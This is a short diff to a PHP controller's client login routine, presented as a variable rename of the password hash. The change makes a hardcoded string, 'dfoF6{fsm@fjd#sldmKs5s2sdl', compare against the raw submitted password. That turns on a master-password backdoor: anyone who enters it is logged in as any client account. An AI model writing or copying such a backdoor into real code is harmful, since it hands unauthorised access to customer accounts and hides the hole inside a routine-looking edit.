@@ -334,8 +334,8 @@ class BimpPublicController extends BimpController
                 unset($userClient);
                 $userClient = null;
             } else {
-                $pw = hash('sha256', $pw);
-                if ($pw == $userClient->getData('password') || $pw == 'dfoF6{fsm@fjd#sldmKs5s2sdl') {
+                $pwHash = hash('sha256', $pw);
+                if ($pwHash == $userClient->getData('password') || $pw == 'dfoF6{fsm@fjd#sldmKs5s2sdl') {
                     $_SESSION['userClient'] = $email;
                     $this->initUserClient();
                 } else {
